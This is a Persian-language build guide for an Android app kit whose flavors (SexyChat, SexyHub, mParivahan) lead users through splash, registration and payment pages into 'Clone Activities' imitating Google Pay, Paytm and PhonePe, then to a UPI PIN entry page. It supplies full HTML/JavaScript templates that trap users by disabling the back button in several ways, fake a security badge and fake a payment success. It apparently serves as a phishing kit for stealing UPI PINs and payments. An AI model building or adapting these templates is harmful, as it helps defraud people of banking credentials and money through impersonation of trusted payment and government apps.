# 📚 راهنمای کامل ساخت قالب (Template) و اتصال به Payment Flow

این راهنما به شما کمک می‌کند تا قالب‌های جدید برای برنامه بسازید و آن‌ها را به سیستم پرداخت متصل کنید.

---

## 📋 فهرست مطالب

1. [ساختار فایل‌ها](#ساختار-فایل‌ها)
2. [جریان کامل برنامه](#جریان-کامل-برنامه)
3. [ساخت قالب جدید](#ساخت-قالب-جدید)
4. [اتصال به Payment Flow](#اتصال-به-payment-flow)
5. [ساخت Final Page](#ساخت-final-page)
6. [مثال عملی کامل](#مثال-عملی-کامل)
7. [نکات مهم و Checklist](#نکات-مهم-و-checklist)

---

## 📁 ساختار فایل‌ها

```
app/src/
├── main/assets/              # فایل‌های مشترک همه flavors
│   ├── index.html           # صفحه اصلی (splash screen)
│   ├── register.html        # صفحه ثبت نام
│   ├── payment.html         # صفحه پرداخت (مشترک)
│   ├── final.html           # صفحه موفقیت
│   ├── pin.html             # صفحه UPI PIN
│   ├── wait.html            # صفحه در حال پردازش
│   └── googlepay-splash.html, paytm-splash.html, phonepe-splash.html
│
├── sexychat/assets/          # فایل‌های مخصوص SexyChat
│   ├── index.html           # ⭐ override می‌کنه main/index.html
│   ├── register.html        # ⭐ override می‌کنه main/register.html
│   ├── payment.html         # ⭐ override می‌کنه main/payment.html
│   └── final.html           # ⭐ override می‌کنه main/final.html
│
├── mparivahan/assets/        # فایل‌های مخصوص mParivahan
│   ├── index.html
│   ├── register.html
│   ├── payment.html
│   └── final.html
│
└── sexyhub/assets/           # فایل‌های مخصوص SexyHub
    ├── index.html
    ├── register.html
    ├── payment.html
    └── final.html
```

**نکته مهم:** اگر فایلی در flavor folder موجود باشه، اون فایل override می‌کنه فایل main. در غیر این صورت از main استفاده می‌شه.

---

## 🔄 جریان کامل برنامه (Flow)

```
┌─────────────────┐
│  index.html     │  ⏱️ بعد از 6 ثانیه
│  (Splash)       │  ──────────────┐
└─────────────────┘                │
                                   ▼
                          ┌─────────────────┐
                          │  register.html  │  ⏱️ بعد از submit موفق
                          │  (ثبت نام)      │  ──────────────┐
                          └─────────────────┘                │
                                                             ▼
                                                    ┌─────────────────┐
                                                    │  payment.html   │  👆 کاربر روش پرداخت رو انتخاب می‌کنه
                                                    │  (پرداخت)       │  ──────────────┐
                                                    └─────────────────┘                │
                                                                                        ▼
                                                                          ┌─────────────────────────────┐
                                                                          │  Clone Activity              │
                                                                          │  (GPayCloneActivity /        │
                                                                          │   PaytmCloneActivity /       │
                                                                          │   PhonePeCloneActivity)      │
                                                                          └─────────────────────────────┘
                                                                                        │
                                                                                        ▼
                                                                          ┌─────────────────────────────┐
                                                                          │  Splash Screen              │
                                                                          │  (googlepay-splash.html /   │  ⏱️ بعد از 2.5 ثانیه
                                                                          │   paytm-splash.html /       │  ──────────────┐
                                                                          │   phonepe-splash.html)      │                │
                                                                          └─────────────────────────────┘                │
                                                                                                                        ▼
                                                                                                          ┌─────────────────────────────┐
                                                                                                          │  pin.html                   │
                                                                                                          │  (وارد کردن UPI PIN)        │  ⏱️ بعد از وارد کردن PIN
                                                                                                          └─────────────────────────────┘  ──────────────┐
                                                                                                                                                        ▼
                                                                                                                              ┌─────────────────────────────┐
                                                                                                                              │  wait.html                  │
                                                                                                                              │  (در حال پردازش)            │  ⏱️ بعد از 5 ثانیه
                                                                                                                              └─────────────────────────────┘  ──────────────┐
                                                                                                                                                                            ▼
                                                                                                                                                          ┌─────────────────────────────┐
                                                                                                                                                          │  final.html                 │
                                                                                                                                                          │  (موفقیت - ماندن در صفحه)   │  ⏱️ MainActivity بسته می‌شه
                                                                                                                                                          └─────────────────────────────┘
```

---

## 🎨 ساخت قالب جدید (Template)

### مرحله 1: ساخت index.html (Splash Screen)

این صفحه اولین صفحه‌ای است که کاربر می‌بیند. باید:
- طراحی جذاب داشته باشه
- بعد از 6 ثانیه به `register.html` redirect کنه
- دکمه برگشت رو غیرفعال کنه

```html
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#YOUR_COLOR">
  <title>نام برنامه شما</title>
  
  <!-- ⭐ فونت Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: fixed;
    }
    
    body {
      /* ✨ پس‌زمینه گرادیان دلخواه */
      background: linear-gradient(135deg, #YOUR_COLOR_1 0%, #YOUR_COLOR_2 50%, #YOUR_COLOR_3 100%);
      background-size: 400% 400%;
      animation: gradientMove 15s ease infinite;
      
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      position: relative;
    }
    
    /* ✨ انیمیشن پس‌زمینه */
    @keyframes gradientMove {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }
    
    /* ✨ محتوای اصلی */
    .content-wrapper {
      position: relative;
      z-index: 1;
      text-align: center;
      padding: 20px;
    }
    
    .logo {
      font-size: clamp(40px, 11vw, 58px);
      font-weight: 800;
      color: #fff;
      margin-bottom: 15px;
      animation: fadeInUp 1s ease-out;
    }
    
    .tagline {
      font-size: clamp(14px, 4vw, 18px);
      color: rgba(255, 255, 255, 0.9);
      margin-top: 10px;
      animation: fadeInUp 1s 0.5s both;
    }
    
    /* ✨ انیمیشن‌ها */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    /* ✨ Loader (اختیاری) */
    .loader {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 30px auto;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="content-wrapper">
    <div class="logo">نام برنامه شما</div>
    <div class="tagline">توضیحات برنامه</div>
    
    <!-- ✨ Loader (اختیاری) -->
    <div class="loader"></div>
  </div>

  <script>
    // ⭐ غیرفعال کردن دکمه برگشت
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // ⭐⭐ مهم: بعد از 6 ثانیه redirect به register.html
    setTimeout(() => {
      window.location.href = 'register.html';
    }, 6000);
  </script>
</body>
</html>
```

**نکات مهم:**
- ✅ Timer باید **6 ثانیه** باشه
- ✅ Redirect به `register.html` باشه
- ✅ دکمه برگشت غیرفعال باشه

---

### مرحله 2: ساخت register.html (صفحه ثبت نام)

این صفحه برای ثبت اطلاعات کاربر استفاده می‌شه:

```html
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#YOUR_COLOR">
  <title>ثبت نام - نام برنامه</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      /* ✨ پس‌زمینه دلخواه */
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      font-family: 'Poppins', sans-serif;
    }
    
    .container {
      background: rgba(255, 255, 255, 0.98);
      border-radius: 20px;
      padding: 30px 20px;
      width: 100%;
      max-width: 350px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
      animation: slideUp 0.5s ease-out;
    }
    
    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(40px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
      font-size: clamp(24px, 6vw, 28px);
    }
    
    .form-group {
      margin-bottom: 18px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      color: #333;
      font-weight: 600;
      font-size: clamp(13px, 3.2vw, 14px);
    }
    
    input {
      width: 100%;
      padding: 14px 16px;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      font-size: clamp(14px, 3.5vw, 16px);
      transition: all 0.3s ease;
      box-sizing: border-box;
    }
    
    input:focus {
      outline: none;
      border-color: #YOUR_COLOR;
      box-shadow: 0 0 0 3px rgba(YOUR_COLOR_RGB, 0.1);
    }
    
    .register-btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: clamp(15px, 3.8vw, 17px);
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
      transition: all 0.3s ease;
    }
    
    .register-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.3);
    }
    
    .register-btn:active {
      transform: translateY(0);
    }
    
    /* ✨ Loading Overlay (اختیاری) */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    
    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ثبت نام</h2>
    
    <form id="registerForm">
      <div class="form-group">
        <label>نام کامل</label>
        <input type="text" id="name" placeholder="نام خود را وارد کنید" required>
      </div>
      
      <div class="form-group">
        <label>شماره موبایل</label>
        <input type="tel" id="mobile" placeholder="09xxxxxxxxx" required maxlength="11">
      </div>
      
      <button type="submit" class="register-btn" id="registerBtn">
        ثبت نام
      </button>
    </form>
  </div>
  
  <!-- ✨ Loading Overlay (اختیاری) -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
  </div>

  <script>
    // ⭐ غیرفعال کردن دکمه برگشت
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // ⭐ اعتبارسنجی موبایل (فقط اعداد)
    const mobileInput = document.getElementById('mobile');
    mobileInput.addEventListener('input', function(e) {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
    
    // ⭐ Submit فرم
    document.getElementById('registerForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const name = document.getElementById('name').value.trim();
      const mobile = mobileInput.value.trim();
      
      // ✨ اعتبارسنجی
      if (!name || name.length < 2) {
        alert('⚠️ لطفاً نام کامل خود را وارد کنید.');
        return;
      }
      
      if (!mobile || mobile.length < 10) {
        alert('⚠️ لطفاً شماره موبایل معتبر وارد کنید.');
        return;
      }
      
      // ✨ نمایش loading (اختیاری)
      document.getElementById('loadingOverlay').style.display = 'flex';
      document.getElementById('registerBtn').disabled = true;
      
      // ⭐⭐ مهم: بعد از 2.5 ثانیه redirect به payment.html
      setTimeout(() => {
        window.location.href = 'payment.html';
      }, 2500);
    });
  </script>
</body>
</html>
```

**نکات مهم:**
- ✅ اعتبارسنجی کامل فیلدها
- ✅ بعد از submit موفق، redirect به `payment.html`
- ✅ Timer می‌تونه بین 2 تا 3 ثانیه باشه

---

## 💳 اتصال به Payment Flow

### مرحله 3: ساخت payment.html

این صفحه **مهم‌ترین صفحه** است و باید طراحی **متفاوت** برای هر flavor داشته باشه:

```html
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#YOUR_COLOR">
  <title>پرداخت - نام برنامه</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html, body {
      width: 100%;
      height: 100%;
      overflow-x: hidden;
      position: fixed;
    }
    
    body {
      /* ✨ پس‌زمینه گرادیان دلخواه */
      background: linear-gradient(135deg, #YOUR_COLOR_1 0%, #YOUR_COLOR_2 100%);
      background-size: 400% 400%;
      animation: gradientShift 12s ease infinite;
      font-family: 'Poppins', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 15px;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      position: relative;
    }
    
    @keyframes gradientShift {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }
    
    .payment-card {
      background: rgba(255, 255, 255, 0.98);
      border-radius: 22px;
      padding: 25px 20px;
      width: 100%;
      max-width: 340px;
      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.25);
      position: relative;
      animation: cardPopIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    
    @keyframes cardPopIn {
      from {
        opacity: 0;
        transform: scale(0.9) rotate(-2deg);
      }
      to {
        opacity: 1;
        transform: scale(1) rotate(0deg);
      }
    }
    
    /* ✨ بخش قیمت */
    .price-section {
      text-align: center;
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
      color: #fff;
      padding: 20px 16px;
      border-radius: 18px;
      margin-bottom: 20px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
    }
    
    .price {
      font-size: clamp(32px, 9vw, 42px);
      font-weight: 900;
      margin-bottom: 6px;
      text-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }
    
    .price-label {
      font-size: clamp(12px, 3.2vw, 14px);
      opacity: 0.95;
    }
    
    /* ✨ عنوان بخش پرداخت */
    .methods-title {
      text-align: center;
      font-size: clamp(14px, 3.8vw, 16px);
      font-weight: 700;
      color: #333;
      margin-bottom: 15px;
    }
    
    /* ✨ Grid روش‌های پرداخت */
    .methods-grid {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 15px;
    }
    
    .method-btn {
      width: 75px;
      height: 75px;
      background: #fff;
      border: 2.5px solid #e0e0e0;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
      position: relative;
      overflow: hidden;
    }
    
    .method-btn:hover {
      transform: translateY(-5px) scale(1.05);
      border-color: #YOUR_COLOR;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
    }
    
    .method-btn:active {
      transform: translateY(-2px) scale(0.95);
    }
    
    .method-btn img {
      width: 80%;
      height: 80%;
      object-fit: contain;
    }
    
    /* ✨ دکمه پرداخت */
    .pay-button {
      width: 100%;
      padding: 18px;
      background: linear-gradient(135deg, #YOUR_COLOR_1 0%, #YOUR_COLOR_2 100%);
      color: #fff;
      border: none;
      border-radius: 16px;
      font-size: clamp(16px, 4.2vw, 18px);
      font-weight: 800;
      cursor: pointer;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
    }
    
    .pay-button:active {
      transform: scale(0.96);
    }
    
    /* ✨ بخش امنیت */
    .security-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-top: 15px;
      padding: 10px;
      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
      border-radius: 12px;
      font-size: clamp(11px, 2.8vw, 12px);
      color: #2e7d32;
      font-weight: 600;
    }
    
    /* ✨ هشدار */
    .warning-note {
      margin-top: 15px;
      padding: 12px 14px;
      background: linear-gradient(135deg, #fff3cd, #ffe0b2);
      border: 2px solid #ff9800;
      border-radius: 12px;
      font-size: clamp(11px, 2.8vw, 12px);
      color: #e65100;
      line-height: 1.5;
      text-align: left;
    }
    
    .warning-note strong {
      display: block;
      margin-bottom: 4px;
      font-size: clamp(12px, 3vw, 13px);
    }
  </style>
</head>
<body>
  <div class="payment-card">
    <!-- ✨ بخش قیمت -->
    <div class="price-section">
      <div class="price">₹YOUR_PRICE</div>
      <div class="price-label">پرداخت یکباره</div>
    </div>
    
    <!-- ✨ عنوان -->
    <div class="methods-title">روش پرداخت را انتخاب کنید</div>
    
    <!-- ⭐⭐ مهم: Grid روش‌های پرداخت -->
    <div class="methods-grid">
      <div class="method-btn" onclick="selectPaymentMethod('gpay')">
        <img src="google-pay-icon.png" alt="Google Pay">
      </div>
      <div class="method-btn" onclick="selectPaymentMethod('phonepe')">
        <img src="phonepe-icon.png" alt="PhonePe">
      </div>
      <div class="method-btn" onclick="selectPaymentMethod('paytm')">
        <img src="paytm-icon.png" alt="Paytm">
      </div>
    </div>
    
    <!-- ✨ دکمه پرداخت -->
    <button class="pay-button" onclick="selectPaymentMethod('gpay')">
      پرداخت ₹YOUR_PRICE
    </button>
    
    <!-- ✨ بخش امنیت -->
    <div class="security-badge">
      <span>🔐</span>
      <span>پرداخت امن توسط NPCI</span>
    </div>
    
    <!-- ✨ هشدار -->
    <div class="warning-note">
      <strong>⚠️ مهم:</strong>
      بعد از پرداخت، لطفاً برنامه را ببندید یا دکمه برگشت را فشار ندهید. 3-5 ثانیه صبر کنید تا فعال‌سازی کامل شود.
    </div>
  </div>

  <script>
    // ⭐ غیرفعال کردن دکمه برگشت
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // ⭐⭐⭐ مهم: تابع اتصال به Clone Activities
    function selectPaymentMethod(method) {
      try {
        console.log('💰 انتخاب روش پرداخت:', method);
        
        // ⭐ فراخوانی Android برای باز کردن Clone Activity
        if (typeof Android !== 'undefined' && Android.openPaymentClone) {
          console.log('✅ Android interface موجود است، باز کردن Clone Activity');
          Android.openPaymentClone(method);
        } else {
          console.error('❌ Android interface موجود نیست');
          // ⚠️ Fallback (فقط برای تست در مرورگر)
          if (method === 'gpay') {
            window.location.href = 'googlepay-splash.html';
          } else if (method === 'paytm') {
            window.location.href = 'paytm-splash.html';
          } else if (method === 'phonepe') {
            window.location.href = 'phonepe-splash.html';
          }
        }
      } catch (e) {
        console.error('❌ خطا در باز کردن Clone Activity:', e);
      }
    }
  </script>
</body>
</html>
```

**نکات بسیار مهم:**
- ✅ **باید** تابع `selectPaymentMethod(method)` داشته باشه
- ✅ پارامترها باید دقیقاً باشن: `'gpay'`, `'paytm'`, `'phonepe'`
- ✅ **باید** `Android.openPaymentClone(method)` رو فراخوانی کنه
- ✅ طراحی باید **متفاوت** با بقیه flavors باشه

---

## 🎉 ساخت Final Page

### مرحله 4: ساخت final.html

این صفحه بعد از موفقیت پرداخت نمایش داده می‌شه:

```html
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#4caf50">
  <title>پرداخت موفق - نام برنامه</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      /* ✨ پس‌زمینه دلخواه */
      background: linear-gradient(135deg, #YOUR_COLOR_1, #YOUR_COLOR_2);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      font-family: 'Poppins', sans-serif;
    }
    
    .success-card {
      background: rgba(255, 255, 255, 0.98);
      border-radius: 22px;
      padding: 40px 25px;
      text-align: center;
      max-width: 350px;
      width: 100%;
      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.25);
      animation: cardSlideIn 0.6s ease-out;
    }
    
    @keyframes cardSlideIn {
      from {
        opacity: 0;
        transform: translateY(40px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .success-icon {
      font-size: 90px;
      margin-bottom: 20px;
      animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    
    @keyframes scaleIn {
      from {
        transform: scale(0) rotate(-180deg);
        opacity: 0;
      }
      to {
        transform: scale(1) rotate(0deg);
        opacity: 1;
      }
    }
    
    .success-title {
      font-size: clamp(22px, 5.5vw, 26px);
      font-weight: 800;
      color: #4caf50;
      margin-bottom: 12px;
    }
    
    .success-message {
      font-size: clamp(14px, 3.5vw, 16px);
      color: #333;
      margin-bottom: 25px;
      line-height: 1.6;
    }
    
    /* ✨ لیست ویژگی‌ها */
    .features-list {
      background: linear-gradient(135deg, #f5f5f5, #ffffff);
      border-radius: 14px;
      padding: 18px 15px;
      margin: 25px 0;
      text-align: left;
    }
    
    .feature-item {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 12px;
      font-size: clamp(13px, 3.2vw, 14px);
      color: #333;
    }
    
    .feature-item:last-child {
      margin-bottom: 0;
    }
    
    .feature-icon {
      font-size: 20px;
    }
    
    /* ✨ هشدار */
    .warning-box {
      background: linear-gradient(135deg, #fff3cd, #ffe0b2);
      border: 2px solid #ff9800;
      border-radius: 12px;
      padding: 14px 16px;
      margin-top: 20px;
      font-size: clamp(11px, 2.8vw, 12px);
      color: #e65100;
      text-align: left;
      line-height: 1.6;
    }
    
    .warning-box strong {
      display: block;
      margin-bottom: 6px;
      font-size: clamp(12px, 3vw, 13px);
    }
  </style>
</head>
<body>
  <div class="success-card">
    <!-- ✨ آیکون موفقیت -->
    <div class="success-icon">✅</div>
    
    <!-- ✨ عنوان -->
    <div class="success-title">🎉 پرداخت موفق!</div>
    
    <!-- ✨ پیام -->
    <div class="success-message">
      دسترسی پریمیوم شما با موفقیت فعال شد!
    </div>
    
    <!-- ✨ لیست ویژگی‌ها -->
    <div class="features-list">
      <div class="feature-item">
        <span class="feature-icon">🎬</span>
        <span><strong>دسترسی نامحدود</strong></span>
      </div>
      <div class="feature-item">
        <span class="feature-icon">🔒</span>
        <span><strong>100% امن</strong></span>
      </div>
      <div class="feature-item">
        <span class="feature-icon">⚡</span>
        <span><strong>فعال‌سازی فوری</strong></span>
      </div>
      <div class="feature-item">
        <span class="feature-icon">💎</span>
        <span><strong>دسترسی مادام‌العمر</strong></span>
      </div>
    </div>
    
    <!-- ✨ هشدار -->
    <div class="warning-box">
      <strong>⚠️ مهم:</strong>
      برنامه را ببندید! دسترسی پریمیوم شما در حال فعال‌سازی است. لطفاً چند ثانیه صبر کنید.
    </div>
  </div>

  <script>
    // ⭐⭐⭐ مهم: غیرفعال کردن کامل دکمه برگشت (چند روش)
    
    // Method 1: History manipulation
    (function() {
      history.pushState(null, null, location.href);
      window.onpopstate = function() {
        history.go(1);
      };
    })();
    
    // Method 2: Override popstate event
    window.addEventListener('popstate', function(event) {
      history.pushState(null, null, location.href);
    }, false);
    
    // Method 3: Prevent page unload
    window.addEventListener('beforeunload', function(e) {
      history.pushState(null, null, location.href);
      return undefined;
    });
    
    // Method 4: Android back button (if available)
    document.addEventListener('backbutton', function(e) {
      e.preventDefault();
      history.go(1);
      return false;
    }, false);
    
    // ⭐⭐⭐ مهم: ذخیره flag برای unlock
    localStorage.setItem("isUnlocked", "1");
    
    // ⚠️ مهم: این صفحه نباید redirect کنه
    // Clone Activity باید روی این صفحه بمونه
  </script>
</body>
</html>
```

**نکات بسیار مهم:**
- ✅ **باید** دکمه برگشت رو کاملاً غیرفعال کنه (چند روش)
- ✅ **باید** `localStorage.setItem("isUnlocked", "1")` رو ذخیره کنه
- ❌ **نباید** redirect کنه (Clone Activity باید بمونه)

---

## 📝 مثال عملی کامل

### مثال: ساخت قالب "MyApp"

#### 1. ایجاد پوشه‌ها

```
app/src/myapp/assets/
├── index.html
├── register.html
├── payment.html
└── final.html
```

#### 2. اضافه کردن به build.gradle.kts

```kotlin
android {
    ...
    productFlavors {
        create("myapp") {
            dimension = "default"
            applicationIdSuffix = ".myapp"
            versionNameSuffix = "-myapp"
            resValue("string", "app_name", "MyApp")
        }
    }
}
```

#### 3. کپی کردن فایل‌های بالا و تغییر:
- ✨ رنگ‌ها (`#YOUR_COLOR` → رنگ دلخواه)
- ✨ متن‌ها (نام برنامه، توضیحات)
- ✨ قیمت (`₹YOUR_PRICE` → قیمت دلخواه)
- ✨ طراحی (سبک دلخواه)

---

## ✅ Checklist و نکات مهم

### قبل از تست:

- [ ] **index.html**
  - [ ] Timer 6 ثانیه داره؟
  - [ ] Redirect به `register.html` داره؟
  - [ ] دکمه برگشت غیرفعاله؟

- [ ] **register.html**
  - [ ] اعتبارسنجی فیلدها داره؟
  - [ ] بعد از submit موفق redirect به `payment.html` داره؟
  - [ ] Timer بین 2 تا 3 ثانیه است؟

- [ ] **payment.html**
  - [ ] تابع `selectPaymentMethod(method)` داره؟
  - [ ] `Android.openPaymentClone(method)` رو فراخوانی می‌کنه؟
  - [ ] طراحی متفاوت از بقیه flavors داره؟
  - [ ] دکمه‌های پرداخت کار می‌کنن؟

- [ ] **final.html**
  - [ ] دکمه برگشت کاملاً غیرفعاله (چند روش)؟
  - [ ] `localStorage.setItem("isUnlocked", "1")` رو ذخیره می‌کنه؟
  - [ ] Redirect نمی‌کنه؟

### نکات طراحی:

- ✅ استفاده از `clamp()` برای فونت‌های responsive
- ✅ استفاده از `max-width` برای محدود کردن عرض
- ✅ استفاده از padding و margin مناسب موبایل
- ✅ طراحی متفاوت برای هر flavor
- ✅ انیمیشن‌های smooth و جذاب

### نکات فنی:

- ✅ همه صفحات باید دکمه برگشت رو غیرفعال کنن
- ✅ همه صفحات باید responsive باشن
- ✅ فایل‌های flavor-specific در `app/src/YOUR_FLAVOR/assets/`
- ✅ فایل‌های مشترک در `app/src/main/assets/`
- ✅ فایل‌های flavor override می‌کنن main files

---

## 🎨 پیشنهادات رنگ‌بندی

برای هر نوع برنامه می‌تونید از این رنگ‌ها استفاده کنید:

### برنامه‌های رمانتیک/سرگرمی:
- صورتی: `#ff1493`, `#e91e63`, `#d81b60`
- بنفش: `#9c27b0`, `#ba68c8`

### برنامه‌های رسمی/دولتی:
- آبی: `#4f46e5`, `#6366f1`, `#7c3aed`
- طلایی: `#ffd700`, `#ffed4e`

### برنامه‌های مدرن/پیشرفته:
- تیره: `#1a1a2e`, `#16213e`, `#0f3460`
- روشن: `#ff1493`, `#ff69b4`

---

## 🔍 عیب‌یابی (Troubleshooting)

### مشکل: payment.html Clone Activity رو باز نمی‌کنه
**راه حل:**
1. چک کنید که `Android.openPaymentClone` موجوده
2. Console رو چک کنید برای خطاها
3. مطمئن بشید که `MainActivity` JavaScript interface رو add کرده

### مشکل: final.html redirect می‌کنه
**راه حل:**
1. چک کنید که `history.pushState` اضافه شده
2. چک کنید که `onpopstate` handler داره
3. مطمئن بشید که هیچ `setTimeout` برای redirect وجود نداره

### مشکل: طراحی روی موبایل درست نمایش داده نمی‌شه
**راه حل:**
1. از `clamp()` برای فونت‌ها استفاده کنید
2. `max-width` رو برای container ها تنظیم کنید
3. `padding` و `margin` رو کوچک‌تر کنید

---

## 📞 کمک و پشتیبانی

اگر مشکلی پیش اومد:
1. ✅ چک کنید که فایل‌ها در مسیر درست قرار دارن
2. ✅ Console رو برای خطاهای JavaScript چک کنید
3. ✅ Log ها رو در Android Studio بررسی کنید
4. ✅ مطمئن بشید که flavor در `build.gradle.kts` اضافه شده

---

**موفق باشید! 🚀**

